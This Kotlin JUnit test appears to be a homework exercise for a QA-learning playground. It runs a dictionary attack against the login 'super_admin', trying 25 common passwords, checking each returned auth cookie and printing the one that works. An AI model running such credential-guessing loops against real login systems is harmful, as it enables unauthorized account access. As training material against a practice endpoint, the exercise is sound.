import io.restassured.RestAssured
import org.junit.jupiter.api.Test

class Ex9PasswordBrutoforce {

    @Test
    fun test(){
        val getAuthCookieUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
        val checkAuthCookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

        val login = "super_admin"
        val possiblePassword = arrayOf("123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
            "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
            "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe")

        for (password in possiblePassword){
            // 1. Get auth cookie
            val response = RestAssured
                .given()
                .param("login", login)
                .param("password", password)
                .post(getAuthCookieUrl)
                .andReturn()
            val authCookie = response.getCookie("auth_cookie")

            // 2. Check auth cookie
            val responseForTryAuth = RestAssured
                .given()
                .cookie("auth_cookie", authCookie)
                .get(checkAuthCookie)
                .andReturn()
            if(responseForTryAuth.print().toString() != "You are NOT authorized"){
                println("Correct password is: $password")
                return
            }
        }
    }
}